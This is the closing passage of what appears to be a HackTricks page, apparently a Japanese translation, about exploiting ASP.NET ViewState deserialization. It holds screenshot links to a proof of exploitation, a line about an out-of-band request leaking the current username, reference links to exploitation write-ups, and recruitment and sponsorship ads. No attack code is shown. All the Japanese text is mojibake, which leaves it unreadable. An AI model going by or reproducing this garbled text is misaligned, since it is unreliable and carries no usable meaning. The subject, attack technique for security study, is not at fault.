![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/5.0POC-of-Seccuessful-exploitation.png)

ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å«ã‚€ãƒãƒ³ãƒ‰å¤–ãƒªã‚¯ã‚¨ã‚¹ãƒˆ

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/5.1POC-of-Seccuessful-exploitation.png)

## å‚è€ƒæ–‡çŒ®

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚­ãƒ£ãƒªã‚¢**ã«èˆˆå‘³ãŒã‚ã‚Šã€ãƒãƒƒã‚­ãƒ³ã‚°ã§ããªã„ã‚‚ã®ã‚’ãƒãƒƒã‚¯ã—ãŸã„æ–¹ - **æ¡ç”¨æƒ…å ±ã¯ã“ã¡ã‚‰ï¼** (_æµæš¢ãªãƒãƒ¼ãƒ©ãƒ³ãƒ‰èªã®èª­ã¿æ›¸ããŒå¿…è¦ã§ã™_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ã§</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWS ãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã«åºƒå‘Šã‚’æ²è¼‰ã—ãŸã„**ã€ã¾ãŸã¯ **HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„ [**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ãŠã‚ˆã³ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
